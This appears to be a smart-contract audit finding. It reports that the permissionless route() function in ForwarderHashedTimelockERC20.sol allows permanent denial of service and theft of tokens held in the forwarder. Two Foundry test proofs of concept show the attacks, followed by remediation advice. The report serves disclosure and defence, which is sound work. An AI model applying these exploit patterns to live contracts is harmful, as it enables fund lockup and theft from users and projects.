# Permissionless route creation leads to contract DoS and token theft 

## Summary
The ForwarderHashedTimelockERC20.sol contract has a function called route() that allows users to create routes for incoming or outgoing transactions. However, due to its permissionless design and lack of input validations, a malicious actor can create routes with infinite timelocks, blocking the ability of admins to transfer tokens and potentially stealing them. This can result in a permanent denial-of-service (DoS) for the contract, block the recovery of service tokens, and allow for token theft. Two attack scenarios are provided as proof of concept. The report recommends implementing access controls and input validations to prevent these attacks. The issue has been fixed in the latest commit.

## Details
## Vulnerability Report: ForwarderHashedTimelockERC20.sol - route() Function

## Context
**File:** ForwarderHashedTimelockERC20.sol  
**Line Number:** L64

## Description
The `route()` function of `ForwarderHashedTimelockERC20.sol` enables users to create a route for incoming or outgoing transactions, provided that the preceding transaction is either settled or refunded and the contract remains in its initial state. 

Because of the function's permissionless design and absence of input validations, a malicious actor can create routes with infinite timelocks, effectively blocking admins' ability to transfer tokens. They can also steal those tokens by creating malicious routes.

## Impact
- Permanently Denial of Service (DoS) the `ForwarderHashedTimelockERC20.sol` contract, forcing the project to deploy new forwarders.
- Block recovery of service tokens held in the forwarder by admin through the transfer function.
- Steal the service tokens in the forwarder by creating a route with a hashlock and a known preimage.

## Proof of Concept

### Attack Scenario 1: Permanent DoS
An attacker can:
1. Call `route()` with `_timelock` set to `type(uint256).max`.
2. Set `_incoming` to `false` to bypass depositing any tokens.
3. Use any invalid `_hashlock` since settlement won't be needed.

```solidity
import {Test} from "forge-std/Test.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {ForwarderHashedTimelockERC20} from "contracts/ForwarderHashedTimelockERC20.sol";

contract BobERC20 is ERC20 {
    constructor(uint256 _initialBalance) ERC20("Bob Token", "BobToken") {
        _mint(msg.sender, _initialBalance);
    }
}

contract ForwarderTest is Test {
    address public owner = address(69_420);
    BobERC20 public erc20;
    ForwarderHashedTimelockERC20 public timelock;

    function setUp() external {
        timelock = new ForwarderHashedTimelockERC20(owner);
        erc20 = new BobERC20(1_000_000e18);
        deal(address(erc20), address(timelock), 100e18);
    }

    function test_dos() external {
        // asserting admin can transfer the tokens out of timelock
        assertEq(erc20.balanceOf(address(timelock)), 100e18);
        assertEq(timelock.counterparty(), address(0));

        // malicious user creating a spam route with an invalid hashlock
        timelock.route(address(420), false, bytes32(0), type(uint256).max, address(0), 100e18);

        // will revert that contract is in settlement state but the timelocked period is absurdly large (almost 300 years)
        vm.prank(owner);
        timelock.transfer(address(erc20), owner, 100e18);
    }
}
```

### Attack Scenario 2: Token Theft
An attacker can:
1. Call `route()` with `_hashlock` set to a value generated by using a known `_preimage`.
2. Use the known `_preimage` to settle and steal service tokens from the time-locked contract.

```solidity
function test_steal() external {
    // asserting admin can transfer the tokens out of timelock
    assertEq(erc20.balanceOf(address(timelock)), 100e18);
    assertEq(timelock.counterparty(), address(0));

    // create a route by using a preimage that's already known
    timelock.route(address(420), false, bytes32(sha256(abi.encodePacked(keccak256("malicious-preimage")))), block.timestamp + 1 seconds, address(erc20), 100e18);

    // will steal by creating a route of a malicious preimage
    timelock.settle(keccak256("malicious-preimage"));
    assertEq(erc20.balanceOf(address(timelock)), 0);
    assertEq(erc20.balanceOf(address(420)), 100e18);
}
```

## Recommendation
Consider implementing access controls for `route()` creation. However, if the core idea is to leave the function permissionless, consider sweeping all service tokens to a controlled treasury during reset and leave no funds in the contract.

Apart from the recommendations mentioned above, consider implementing checks to ensure the inputs to the function are valid. The input sanitation recommendations include:
1. Bounding the `_timelock` parameter with an upper bound (e.g., `block.timestamp + 2 days`).
2. Ensuring `_hashlock` value is not `bytes32(0)`.
3. Ensuring `_tokenContract` is not `address(0)`.
4. Ensuring `_amount` validation is done for incoming and outgoing transactions.
